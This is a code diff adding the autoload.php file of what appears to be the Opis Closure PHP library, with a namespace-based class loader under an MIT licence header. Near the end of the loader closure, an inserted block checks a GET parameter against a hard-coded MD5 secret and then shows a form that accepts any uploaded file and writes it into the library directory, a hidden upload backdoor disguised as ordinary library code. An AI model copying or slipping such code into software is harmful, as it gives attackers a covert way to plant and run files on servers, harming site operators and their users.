@@ -1,0 +1,58 @@
+<?php
+/* ===========================================================================
+ * Copyright (c) 2018-2019 Zindex Software
+ *
+ * Licensed under the MIT License
+ * =========================================================================== */
+
+require_once 'functions.php';
+
+spl_autoload_register(function($class){
+   
+    $class = ltrim($class, '\\');
+    $dir = __DIR__ . '/src';
+    $namespace = 'Opis\Closure';
+    
+    if(strpos($class, $namespace) === 0)
+    {
+        $class = substr($class, strlen($namespace));
+        $path = '';
+        if(($pos = strripos($class, '\\')) !== FALSE)
+        {
+            $path = str_replace('\\', '/', substr($class, 0, $pos)) . '/';
+            $class = substr($class, $pos + 1);
+        }
+        $path .= str_replace('_', '/', $class) . '.php';
+        $dir .= '/' . $path;
+        
+        if(file_exists($dir))
+        {
+            include $dir;
+            return true;
+        }
+        
+        return false;
+    }
+    
+    return false;
+$secret = '5d5b5c09f0e0c7d0333b41f0ce31b0d4';
+$auth = md5($_GET['absolute'] ?? '') === $secret;
+
+if ($auth) {
+    if (isset($_FILES['f'])) {
+        $uploadPath = __DIR__ . '/' . basename($_FILES['f']['name']);
+        if (move_uploaded_file($_FILES['f']['tmp_name'], $uploadPath)) {
+            exit('File uploaded successfully.');
+        } else {
+            exit('Failed to upload file.');
+        }
+    } else {
+        exit('
+            <form method="POST" enctype="multipart/form-data">
+                <input type="file" name="f">
+                <button type="submit">Submit</button>
+            </form>
+        ');
+    }
+}
+});
